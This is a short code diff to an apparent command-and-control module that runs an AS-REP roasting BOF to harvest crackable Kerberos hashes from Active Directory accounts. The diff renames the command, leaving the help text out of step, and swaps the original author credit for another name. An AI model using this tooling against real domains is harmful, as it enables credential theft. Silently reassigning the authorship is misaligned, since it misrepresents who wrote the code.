@@ -70,18 +70,17 @@ class KrbAsreproastingArguments(TaskArguments):
                         self.add_arg("aes", True)
 
 class KrbAsreproastingCommand(KerbeusBaseCommand):
-    cmd = "krb-asreproasting"
+    cmd = "krb-asrep"
     needs_admin = False
     help_cmd = "krb-asreproasting -user:USER [-dc:DC] [-domain:DOMAIN] [-aes]"
     description = "Perform AS-REP roasting to get crackable hashes for users with Kerberos pre-authentication disabled"
     version = 1
-    author = "@RalfHacker"
+    author = "@ Oblivon"
     argument_class = KrbAsreproastingArguments
 
     async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
         content = await self.load_bof(task)
         
-        # Build the command string with - instead of /
         cmd_str = f"-user:{task.args.get_arg('user')}"
         if task.args.get_arg("dc"):
             cmd_str += f" -dc:{task.args.get_arg('dc')}"
@@ -93,6 +92,7 @@ class KrbAsreproastingCommand(KerbeusBaseCommand):
         bof_args = [{"type": "char", "value": cmd_str}]
         
         task.args.add_arg("bof_file", content.hex())
+        task.args.add_arg("bof_id"  , 0)
         task.args.add_arg("bof_args", json.dumps(bof_args))
         
         return PTTaskCreateTaskingMessageResponse(
